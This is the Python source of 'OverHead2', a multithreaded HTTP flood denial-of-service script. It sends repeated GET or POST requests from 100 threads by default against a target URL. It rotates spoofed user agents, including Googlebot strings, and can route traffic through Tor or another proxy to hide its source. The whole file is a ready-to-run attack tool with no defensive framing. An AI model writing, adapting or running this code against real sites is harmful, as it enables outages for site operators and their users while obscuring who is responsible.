#!/usr/bin/env python
# -*- encoding: UTF-8 -*-

import random
import re
try:
    import requests
except ImportError:
    print('You must install requests lib\n $ pip install requests')
import threading
import time
import argparse
from arts import Header, options

config = {}     # Stores de configuration provided by the user
success = 0     # Count of the amount of packets successfully send
stop = False    # If True stop all threads
user_agents = [
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
    "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
    "Opera/9.20 (Windows NT 6.0; U; en)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
]

class thread(threading.Thread):
    def __init__(self, config):
        threading.Thread.__init__(self)
        self.url = config["url"]
        self.proxy = config["proxy"]
        self.on = not stop
        self.config = config

    def set_headers(self):
        return {'user-agent': self.config["user_agent"] if self.config["user_agent"] else random.choice(user_agents)}
    def count_packets(self):
        global success
        success += 1

class Get(thread):
    def __init__(self,config):
        super().__init__(config)

    def http_get(self):                 # Change session to previous

        try:
            r = requests.get(self.url, headers=self.set_headers(), proxies=self.proxy)
            self.count_packets()  if r.status_code == 200 else None
        except requests.exceptions.RequestException as e:
            print("Error: {}".format(e))
    def run(self):
        while self.on:
            self.http_get()
            self.on = not stop
            time.sleep(0.01)

class Post(thread):
    def __init__(self,config):
        super().__init__(config)

    def http_post(self):
        try:
            p = requests.post(self.url, data = generate_data(100), headers = self.set_headers(), proxies = self.proxy)
            self.count_packets() if p.status_code == requests.codes.ok else None
        except requests.exceptions.RequestException as e:
            print("Error: {}".format(e))
    def run(self):
        while self.on:
            self.http_post()
            self.on = not stop
            time.sleep(0.01)

class Checker(thread):
    def __init__(self, config, sleep=None):
        super().__init__(config)
        self.sleep = sleep if sleep else 10

    def run(self):
        while(self.on):
            stop = not check_address(self.url)
            time.sleep(self.sleep)
            self.on = not stop

def parse_address(url):
    url_format = "(http|https)|\://"
    link_format = "^[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,3}(/\S*)?$"
    if re.match(url_format + link_format, url):
        return url
    elif re.match(link_format, url):
        return "http://%s" % url
    elif "://" in url:
        return "http:"+url.split(":")[1]
    else:
        print("[!] Url format is incorrect [!]")
        exit(0)

def parse_proxy(proxy):
    if proxy == "tor":
        proxy = "socks5://127.0.0.1:9050"
    elif re.match("(.*:)?.*@.*|.*:.*", proxy):
        proxy = 'http://'+proxy
    return {'http': proxy, 'https': proxy}
def check_address(url):
    # Check if the provided target is up
    try:
        req = requests.get(url)
        return req.status_code == requests.codes.ok
    except ConnectionError:
        print("Connection error")
        return False

def generate_data(leng): 
    # This is used to generate data randomly 
    chars = ["!", "@", "-", "`", ";", "^", "+", "*"]
    msg = ""
    c = 0
    while (len(msg)<leng):
        msg = msg + random.choice(chars)+str(c)
        c+=1
    return msg

def get_parser():
    # Creates a configuration dictionary based on the parameters we gave
    parser = argparse.ArgumentParser(description='OverHead2 DoS script.')
    parser.add_argument('-u', '--url', help='Set an IP or URL as target', type=str)
    parser.add_argument('-t', '--threads', help='Set the number of threads to be created', type=int, default=100)
    parser.add_argument('-p', '--proxy', help='Use proxy. Type tor to use tor as proxy', type=str)
    parser.add_argument('-A', '--user-agent', help='Set a custom User Agent',type=str)
    parser.add_argument('--get', '--GET', help='Perform the attack with HTTP GET', action='store_true')
    parser.add_argument('--post', '--POST', help='Perform the attack with HTTP POST', action='store_true')
    return parser
def check_input(config):
    # Check and manipulate the inputs
    if not config["url"]:
        print('[!]  You must specify a Target  [!]')
        exit(0)
    config["url"] = parse_address(config["url"])
    config["type"] = 'POST' if config["post"] else 'GET' if config['get'] else 'GET'
    if config['post'] and config['get']:
        print("[!] Invalid options. You cannot use GET and POST at once")
        exit(0)
    return config

def main():
    threads_pool = []                        # Stores all active threads
    Header()                                 # Prints the header
    options = get_parser()                   # Get the arguments
    config = check_input(vars(options.parse_args()))

    # PRINT INFO BANNER
    status = check_address(config["url"])
    separator = "#"+"="*40+"#"
    print("{0} \n# Target: {1}\n# Threads: {2}\n# Status: {3}\n# Type: {4}\n# Proxy: {5}\n{0}".format(
        separator,
        config["url"],
        config["threads"],
        "online" if status else "offline",
        config["type"],
        config["proxy"]))
    if not status:
        exit(0)
    print("\n> Press enter to launch the attack")
    input()
    # START DE ATTACK 
    starting_time = time.time()
    for c in range(config["threads"]):
        t = Get(config) if config["type"] == "GET" else Post(config)
        threads_pool.append(t)
        t.start()

    # Starts a new checker thread 
    checker = Checker(config)
    checker.start()

    while threading.active_count() > 0:
        now = round(time.time() -starting_time, 1 )
        try:
            print("\r[>] Number of hits: {0}       |   Time: {1}".format(success, now), end="\r")
        except KeyboardInterrupt:
            checker.on = False
            for th in threads_pool:
                th.on = False
    print("\n[!] All threads have been stoped")
    exit(0)

if __name__ == "__main__":
    main()